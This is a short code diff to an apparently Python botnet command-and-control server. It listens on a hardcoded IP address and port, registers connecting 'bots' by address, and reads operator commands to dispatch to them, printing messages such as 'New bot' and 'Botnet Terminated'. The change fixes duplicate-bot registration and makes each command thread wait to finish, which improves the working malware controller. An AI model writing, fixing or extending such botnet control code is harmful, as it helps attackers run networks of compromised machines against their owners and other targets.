@@ -25,10 +25,10 @@ def start_server(port=2003,ip="142.93.197.240"):
     while True:
         try:
             bot,addr = s.accept()
-            botnet[str(addr[0])] = bot
             if(botnet.get(str(addr[0]))):
                 continue
             print("[*] New bot %s"%(str(addr[0])))
+            botnet[str(addr[0])] = bot
             print(">>")
         except socket.error:
             pass
@@ -136,7 +136,7 @@ def main():
             cmd = raw_input(">>")
             command_thread = Thread(target=process_cmd,args=(cmd,))
             command_thread.start()
-            print("[*] Processing command")
+            command_thread.join()
     except KeyboardInterrupt:
         print("[*] Botnet Terminated!")
         sys.exit(0)
